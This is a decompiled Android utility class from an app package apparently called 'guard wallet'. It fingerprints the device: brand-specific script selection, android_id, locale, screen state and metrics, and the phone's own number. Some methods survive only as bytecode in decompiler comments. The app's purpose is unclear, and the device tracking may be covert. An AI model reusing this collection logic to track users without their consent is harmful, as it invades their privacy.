package com.guard.wallet.utils;

import a1.q;
import android.app.Activity;
import android.content.Context;
import android.content.res.Resources;
import android.os.Build;
import android.os.PowerManager;
import android.support.v4.content.ContextCompat;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import com.google.json.Gson;
import com.guard.wallet.req.ScreenMetricsVO;
import java.util.Objects;

public abstract class e {
   public static String a;
   public static Integer b = 0;

   public static String a() {
      String var2 = Build.BRAND.toLowerCase();
      if (!q.B(var2)) {
         var2.getClass();
         int var1 = var2.hashCode();
         byte var0 = -1;
         switch (var1) {
            case -1619859642:
               if (var2.equals("blackshark")) {
                  var0 = 0;
               }
               break;
            case -1320380160:
               if (var2.equals("oneplus")) {
                  var0 = 1;
               }
               break;
            case -1240244679:
               if (var2.equals("google")) {
                  var0 = 2;
               }
               break;
            case -1206476313:
               if (var2.equals("huawei")) {
                  var0 = 3;
               }
               break;
            case -934971466:
               if (var2.equals("realme")) {
                  var0 = 4;
               }
               break;
            case -759499589:
               if (var2.equals("xiaomi")) {
                  var0 = 5;
               }
               break;
            case -151542385:
               if (var2.equals("motorola")) {
                  var0 = 6;
               }
               break;
            case 3240200:
               if (var2.equals("iqoo")) {
                  var0 = 7;
               }
               break;
            case 3242770:
               if (var2.equals("itel")) {
                  var0 = 8;
               }
               break;
            case 3418016:
               if (var2.equals("oppo")) {
                  var0 = 9;
               }
               break;
            case 3446443:
               if (var2.equals("poco")) {
                  var0 = 10;
               }
               break;
            case 3536167:
               if (var2.equals("sony")) {
                  var0 = 11;
               }
               break;
            case 3620012:
               if (var2.equals("vivo")) {
                  var0 = 12;
               }
               break;
            case 3649462:
               if (var2.equals("wiko")) {
                  var0 = 13;
               }
               break;
            case 99462250:
               if (var2.equals("honor")) {
                  var0 = 14;
               }
               break;
            case 103777484:
               if (var2.equals("meizu")) {
                  var0 = 15;
               }
               break;
            case 108389869:
               if (var2.equals("redmi")) {
                  var0 = 16;
               }
               break;
            case 110235987:
               if (var2.equals("tecno")) {
                  var0 = 17;
               }
               break;
            case 1864941562:
               if (var2.equals("samsung")) {
                  var0 = 18;
               }
               break;
            case 1945248885:
               if (var2.equals("infinix")) {
                  var0 = 19;
               }
         }

         switch (var0) {
            case 0:
               return "blackshark.js";
            case 1:
               return "oneplus.js";
            case 2:
               return "google.js";
            case 3:
               return "huawei.js";
            case 4:
               return "realme.js";
            case 5:
               return "xiaomi.js";
            case 6:
               return "motorola.js";
            case 7:
               return "iqoo.js";
            case 8:
               return "itel.js";
            case 9:
               return "oppo.js";
            case 10:
               return "poco.js";
            case 11:
               return "sony.js";
            case 12:
               return "vivo.js";
            case 13:
               return "wiko.js";
            case 14:
               return "honor.js";
            case 15:
               return "meizu.js";
            case 16:
               return "redmi.js";
            case 17:
               return "tecno.js";
            case 18:
               return "samsung.js";
            case 19:
               return "infinix.js";
            default:
               return "android.js";
         }
      } else {
         return "android.js";
      }
   }

   public static Activity b() {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.NullPointerException: Cannot read field "id" because the return value of "org.jetbrains.java.decompiler.modules.decompiler.flow.FlattenStatementsHelper.getDirectNode(org.jetbrains.java.decompiler.modules.decompiler.stats.Statement)" is null
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:179)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.processStatement(ExprProcessor.java:112)
      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.getFinallyInformation(FinallyProcessor.java:136)
      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.iterateGraph(FinallyProcessor.java:85)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:178)
      //
      // Bytecode:
      // 00: invokestatic e/b.a ()Landroid/app/Activity;
      // 03: ifnull 0a
      // 06: invokestatic e/b.a ()Landroid/app/Activity;
      // 09: areturn
      // 0a: invokestatic com/guard/wallet/LockActivity.b ()Lcom/guard/wallet/LockActivity;
      // 0d: ifnull 14
      // 10: invokestatic com/guard/wallet/LockActivity.b ()Lcom/guard/wallet/LockActivity;
      // 13: areturn
      // 14: invokestatic com/guard/wallet/activity/ConfirmDeviceActivity.b ()Lcom/guard/wallet/activity/ConfirmDeviceActivity;
      // 17: ifnull 1e
      // 1a: invokestatic com/guard/wallet/activity/ConfirmDeviceActivity.b ()Lcom/guard/wallet/activity/ConfirmDeviceActivity;
      // 1d: areturn
      // 1e: getstatic com/guard/wallet/activity/NoDisplayActivity.a Lcom/guard/wallet/activity/NoDisplayActivity;
      // 21: astore 0
      // 22: ldc com/guard/wallet/activity/NoDisplayActivity
      // 24: monitorenter
      // 25: getstatic com/guard/wallet/activity/NoDisplayActivity.a Lcom/guard/wallet/activity/NoDisplayActivity;
      // 28: astore 0
      // 29: ldc com/guard/wallet/activity/NoDisplayActivity
      // 2b: monitorexit
      // 2c: aload 0
      // 2d: ifnull 42
      // 30: ldc com/guard/wallet/activity/NoDisplayActivity
      // 32: monitorenter
      // 33: getstatic com/guard/wallet/activity/NoDisplayActivity.a Lcom/guard/wallet/activity/NoDisplayActivity;
      // 36: astore 0
      // 37: ldc com/guard/wallet/activity/NoDisplayActivity
      // 39: monitorexit
      // 3a: aload 0
      // 3b: areturn
      // 3c: astore 0
      // 3d: ldc com/guard/wallet/activity/NoDisplayActivity
      // 3f: monitorexit
      // 40: aload 0
      // 41: athrow
      // 42: aconst_null
      // 43: areturn
      // 44: astore 0
      // 45: ldc com/guard/wallet/activity/NoDisplayActivity
      // 47: monitorexit
      // 48: aload 0
      // 49: athrow
   }

   public static String c() {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.RuntimeException: parsing failure!
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:211)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
      //
      // Bytecode:
      // 00: ldc com/guard/wallet/utils/e
      // 02: monitorenter
      // 03: getstatic com/guard/wallet/utils/e.a Ljava/lang/String;
      // 06: astore 0
      // 07: aload 0
      // 08: ifnonnull 40
      // 0b: invokestatic com/guard/wallet/utils/g.Z ()Landroid/content/Context;
      // 0e: ifnull 40
      // 11: ldc "DEVICE_UNIQUE_ID"
      // 13: invokestatic com/guard/wallet/utils/h.l (Ljava/lang/String;)Ljava/lang/String;
      // 16: astore 0
      // 17: aload 0
      // 18: putstatic com/guard/wallet/utils/e.a Ljava/lang/String;
      // 1b: aload 0
      // 1c: ifnonnull 40
      // 1f: invokestatic com/guard/wallet/utils/g.Z ()Landroid/content/Context;
      // 22: invokevirtual android/content/Context.getContentResolver ()Landroid/content/ContentResolver;
      // 25: ldc "android_id"
      // 27: invokestatic android/provider/Settings$Secure.getString (Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;
      // 2a: astore 0
      // 2b: aload 0
      // 2c: putstatic com/guard/wallet/utils/e.a Ljava/lang/String;
      // 2f: aload 0
      // 30: ldc "DEVICE_UNIQUE_ID"
      // 32: invokestatic com/guard/wallet/utils/h.D (Ljava/lang/Object;Ljava/lang/String;)Z
      // 35: pop
      // 36: goto 40
      // 39: astore 0
      // 3a: ldc "DeviceUtils"
      // 3c: aload 0
      // 3d: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 40: getstatic com/guard/wallet/utils/e.a Ljava/lang/String;
      // 43: astore 0
      // 44: ldc com/guard/wallet/utils/e
      // 46: monitorexit
      // 47: aload 0
      // 48: areturn
      // 49: astore 0
      // 4a: ldc com/guard/wallet/utils/e
      // 4c: monitorexit
      // 4d: aload 0
      // 4e: athrow
   }

   // $VF: Handled exception range with multiple entry points by splitting it
   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static String d(Context var0) {
      if (var0 != null) {
         Exception var10000;
         label48: {
            try {
               if (var0.getResources() == null || var0.getResources().getConfiguration() == null) {
                  return null;
               }

               var5 = var0.getResources().getConfiguration().locale;
            } catch (Exception var4) {
               var10000 = var4;
               boolean var10001 = false;
               break label48;
            }

            if (var5 == null) {
               return null;
            }

            label39: {
               try {
                  if (!q.B(var5.toLanguageTag())) {
                     var6 = var5.toLanguageTag();
                     break label39;
                  }
               } catch (Exception var3) {
                  var10000 = var3;
                  boolean var8 = false;
                  break label48;
               }

               try {
                  var6 = var5.getLanguage();
               } catch (Exception var2) {
                  var10000 = var2;
                  boolean var9 = false;
                  break label48;
               }
            }

            try {
               return var6;
            } catch (Exception var1) {
               var10000 = var1;
               boolean var10 = false;
            }
         }

         Exception var7 = var10000;
         q.s("DeviceUtils", var7);
      }

      return null;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static ScreenMetricsVO e() {
      ScreenMetricsVO var4 = new ScreenMetricsVO();
      ScreenMetricsVO var3 = var4;

      Exception var10000;
      label350: {
         Activity var2;
         try {
            var2 = b();
         } catch (Exception var45) {
            var10000 = var45;
            boolean var10001 = false;
            break label350;
         }

         byte var1 = 1;
         ScreenMetricsVO var55;
         if (var2 != null) {
            var3 = var4;

            try {
               b = b().getWindowManager().getDefaultDisplay().getDisplayId();
            } catch (Exception var38) {
               var10000 = var38;
               boolean var61 = false;
               break label350;
            }

            var3 = var4;

            try {
               var52 = new DisplayMetrics();
            } catch (Exception var37) {
               var10000 = var37;
               boolean var62 = false;
               break label350;
            }

            var3 = var4;

            try {
               // [VF-FIX] var52./* $VF: Unable to resugar constructor */<init>();
            } catch (Exception var36) {
               var10000 = var36;
               boolean var63 = false;
               break label350;
            }

            var3 = var4;

            try {
               b().getWindowManager().getDefaultDisplay().getRealMetrics(var52);
            } catch (Exception var35) {
               var10000 = var35;
               boolean var64 = false;
               break label350;
            }

            var3 = var4;

            try {
               var4.setWidth(var52.widthPixels);
            } catch (Exception var34) {
               var10000 = var34;
               boolean var65 = false;
               break label350;
            }

            var3 = var4;

            try {
               var4.setHeight(var52.heightPixels);
            } catch (Exception var33) {
               var10000 = var33;
               boolean var66 = false;
               break label350;
            }

            var3 = var4;

            try {
               var4.setDensity(var52.densityDpi);
            } catch (Exception var32) {
               var10000 = var32;
               boolean var67 = false;
               break label350;
            }

            var3 = var4;

            try {
               var4.setScaledDensity(var52.scaledDensity);
            } catch (Exception var31) {
               var10000 = var31;
               boolean var68 = false;
               break label350;
            }

            var3 = var4;

            try {
               var4.setXdpi(var52.xdpi);
            } catch (Exception var30) {
               var10000 = var30;
               boolean var69 = false;
               break label350;
            }

            var3 = var4;

            try {
               var4.setYdpi(var52.ydpi);
            } catch (Exception var29) {
               var10000 = var29;
               boolean var70 = false;
               break label350;
            }

            int var46;
            label333: {
               label352: {
                  label353: {
                     try {
                        if (b() == null) {
                           break label352;
                        }

                        var46 = b().getResources().getIdentifier("status_bar_height", "dimen", "android");
                     } catch (Exception var43) {
                        var10000 = var43;
                        boolean var71 = false;
                        break label353;
                     }

                     if (var46 <= 0) {
                        break label352;
                     }

                     try {
                        var46 = b().getResources().getDimensionPixelSize(var46);
                        break label333;
                     } catch (Exception var42) {
                        var10000 = var42;
                        boolean var72 = false;
                     }
                  }

                  Exception var53 = var10000;
                  var3 = var4;

                  try {
                     q.s("DeviceUtils", var53);
                  } catch (Exception var28) {
                     var10000 = var28;
                     boolean var73 = false;
                     break label350;
                  }
               }

               var46 = 0;
            }

            var3 = var4;

            try {
               var4.setStatusBarHeight(var46);
            } catch (Exception var27) {
               var10000 = var27;
               boolean var74 = false;
               break label350;
            }

            label318: {
               label354: {
                  label355: {
                     try {
                        if (b() == null) {
                           break label354;
                        }

                        var46 = b().getResources().getIdentifier("navigation_bar_height", "dimen", "android");
                     } catch (Exception var41) {
                        var10000 = var41;
                        boolean var75 = false;
                        break label355;
                     }

                     if (var46 <= 0) {
                        break label354;
                     }

                     try {
                        var46 = b().getResources().getDimensionPixelSize(var46);
                        break label318;
                     } catch (Exception var40) {
                        var10000 = var40;
                        boolean var76 = false;
                     }
                  }

                  Exception var54 = var10000;
                  var3 = var4;

                  try {
                     q.s("DeviceUtils", var54);
                  } catch (Exception var26) {
                     var10000 = var26;
                     boolean var77 = false;
                     break label350;
                  }
               }

               var46 = 0;
            }

            var3 = var4;

            try {
               var4.setNavigationBarHeight(var46);
            } catch (Exception var25) {
               var10000 = var25;
               boolean var78 = false;
               break label350;
            }

            var3 = var4;

            label303: {
               label302: {
                  try {
                     if ((float)var4.getWidth().intValue() / (float)var4.getHeight().intValue() > 0.5F) {
                        break label302;
                     }
                  } catch (Exception var39) {
                     var10000 = var39;
                     boolean var79 = false;
                     break label350;
                  }

                  var49 = false;
                  break label303;
               }

               var49 = true;
            }

            byte var50;
            if (var49) {
               var50 = 1;
            } else {
               var50 = 0;
            }

            var3 = var4;

            try {
               var4.setIsScreenRound(Integer.valueOf(var50));
            } catch (Exception var24) {
               var10000 = var24;
               boolean var80 = false;
               break label350;
            }

            var55 = var4;
         } else {
            label356: {
               var3 = var4;

               String var5;
               try {
                  var5 = h.l("screenMetrics");
               } catch (Exception var23) {
                  var10000 = var23;
                  boolean var81 = false;
                  break label350;
               }

               var55 = var4;
               var3 = var4;

               try {
                  if (q.B(var5)) {
                     break label356;
                  }
               } catch (Exception var44) {
                  var10000 = var44;
                  boolean var82 = false;
                  break label350;
               }

               var3 = var4;

               try {
                  var56 = new Gson();
               } catch (Exception var22) {
                  var10000 = var22;
                  boolean var83 = false;
                  break label350;
               }

               var3 = var4;

               try {
                  // [VF-FIX] var56./* $VF: Unable to resugar constructor */<init>();
               } catch (Exception var21) {
                  var10000 = var21;
                  boolean var84 = false;
                  break label350;
               }

               var3 = var4;

               try {
                  var55 = var56.fromJson(var5, ScreenMetricsVO.class);
               } catch (Exception var20) {
                  var10000 = var20;
                  boolean var85 = false;
                  break label350;
               }
            }
         }

         var3 = var55;

         try {
            var55.setState(h.i("screenState"));
         } catch (Exception var19) {
            var10000 = var19;
            boolean var86 = false;
            break label350;
         }

         var3 = var55;

         label357: {
            label358: {
               label359: {
                  try {
                     if (j()) {
                        break label359;
                     }
                  } catch (Exception var18) {
                     var10000 = var18;
                     boolean var87 = false;
                     break label350;
                  }

                  var3 = var55;

                  try {
                     var55.setIsScreenOn(0);
                  } catch (Exception var13) {
                     var10000 = var13;
                     boolean var88 = false;
                     break label350;
                  }

                  var3 = var55;

                  try {
                     if (Objects.equals(var55.getState(), 0)) {
                        break label357;
                     }
                  } catch (Exception var17) {
                     var10000 = var17;
                     boolean var89 = false;
                     break label350;
                  }

                  var3 = var55;

                  try {
                     if (Objects.equals(var55.getState(), 3)) {
                        break label357;
                     }
                  } catch (Exception var16) {
                     var10000 = var16;
                     boolean var90 = false;
                     break label350;
                  }

                  var3 = var55;

                  try {
                     var58 = 0;
                     break label358;
                  } catch (Exception var11) {
                     var10000 = var11;
                     boolean var91 = false;
                     break label350;
                  }
               }

               var3 = var55;

               try {
                  var55.setIsScreenOn(1);
               } catch (Exception var14) {
                  var10000 = var14;
                  boolean var92 = false;
                  break label350;
               }

               var3 = var55;

               try {
                  if (!Objects.equals(var55.getState(), 0)) {
                     break label357;
                  }
               } catch (Exception var15) {
                  var10000 = var15;
                  boolean var93 = false;
                  break label350;
               }

               var3 = var55;

               try {
                  var58 = 1;
               } catch (Exception var12) {
                  var10000 = var12;
                  boolean var94 = false;
                  break label350;
               }
            }

            var3 = var55;

            try {
               var55.setState(var58);
            } catch (Exception var10) {
               var10000 = var10;
               boolean var95 = false;
               break label350;
            }
         }

         var3 = var55;

         byte var51;
         label203: {
            label202: {
               try {
                  if (com.guard.wallet.helper.g.g()) {
                     break label202;
                  }
               } catch (Exception var9) {
                  var10000 = var9;
                  boolean var96 = false;
                  break label350;
               }

               var51 = 0;
               break label203;
            }

            var51 = var1;
         }

         var3 = var55;

         try {
            var55.setIsBlocked(Integer.valueOf(var51));
         } catch (Exception var8) {
            var10000 = var8;
            boolean var97 = false;
            break label350;
         }

         var3 = var55;

         try {
            var55.setScreenOffTimeout(g.P0());
         } catch (Exception var7) {
            var10000 = var7;
            boolean var98 = false;
            break label350;
         }

         var3 = var55;

         try {
            h.D(h.N(var55), "screenMetrics");
            return var55;
         } catch (Exception var6) {
            var10000 = var6;
            boolean var99 = false;
         }
      }

      Exception var57 = var10000;
      q.s("DeviceUtils", var57);
      return var3;
   }

   public static String f(String var0) {
      String var1 = var0;
      if (!q.B(var0)) {
         var1 = var0;
         if (var0.contains("-")) {
            String[] var2 = var0.split("-");
            var1 = var0;
            if (var2.length > 1) {
               var1 = var2[0];
            }
         }
      }

      return var1;
   }

   public static boolean g() {
      String var1 = Build.BRAND;
      boolean var0;
      if (!var1.equalsIgnoreCase("huawei") && !var1.equalsIgnoreCase("honor") && !var1.equalsIgnoreCase("wiko")) {
         var0 = false;
      } else {
         var0 = true;
      }

      return var0;
   }

   public static boolean h() {
      if (g.Z() != null && g()) {
         boolean var1;
         try {
            int var0 = Resources.getSystem().getIdentifier("config_os_brand", "string", "android");
            String var2 = g.Z().getString(var0);
            if (q.B(var2)) {
               return false;
            }

            var1 = var2.toLowerCase().contains("harmony");
         } catch (Exception var3) {
            q.s("DeviceUtils", var3);
            return false;
         }

         if (var1) {
            return true;
         }
      }

      return false;
   }

   public static boolean i() {
      String var1 = Build.BRAND;
      boolean var0;
      if (!var1.equalsIgnoreCase("oppo") && !var1.equalsIgnoreCase("realme") && !var1.equalsIgnoreCase("oneplus")) {
         var0 = false;
      } else {
         var0 = true;
      }

      return var0;
   }

   public static boolean j() {
      Context var2 = g.Z();
      boolean var1 = false;
      boolean var0 = var1;
      if (var2 != null) {
         try {
            var0 = ((PowerManager)var2.getSystemService("power")).isInteractive();
         } catch (Exception var3) {
            q.s("DeviceUtils", var3);
            var0 = var1;
         }
      }

      return var0;
   }

   public static boolean k() {
      String var1 = Build.BRAND;
      boolean var0;
      if (!var1.equalsIgnoreCase("tecno") && !var1.equalsIgnoreCase("itel") && !var1.equalsIgnoreCase("infinix")) {
         var0 = false;
      } else {
         var0 = true;
      }

      return var0;
   }

   public static boolean l() {
      String var1 = Build.BRAND;
      boolean var0;
      if (!var1.equalsIgnoreCase("vivo") && !var1.equalsIgnoreCase("iqoo")) {
         var0 = false;
      } else {
         var0 = true;
      }

      return var0;
   }

   public static boolean m() {
      String var1 = Build.BRAND;
      boolean var0;
      if (!var1.equalsIgnoreCase("redmi") && !var1.equalsIgnoreCase("xiaomi") && !var1.equalsIgnoreCase("poco") && !var1.equalsIgnoreCase("blackshark")) {
         var0 = false;
      } else {
         var0 = true;
      }

      return var0;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static String n() {
      if (g.Z() != null) {
         Exception var10000;
         label29: {
            TelephonyManager var0;
            try {
               var0 = (TelephonyManager)g.Z().getSystemService("phone");
            } catch (Exception var2) {
               var10000 = var2;
               boolean var10001 = false;
               break label29;
            }

            if (var0 == null) {
               return null;
            }

            try {
               if (ContextCompat.checkSelfPermission(g.Z(), "android.permission.READ_PHONE_STATE") == 0) {
                  return var0.getLine1Number();
               }

               return null;
            } catch (Exception var1) {
               var10000 = var1;
               boolean var4 = false;
            }
         }

         Exception var3 = var10000;
         q.s("DeviceUtils", var3);
      }

      return null;
   }
}
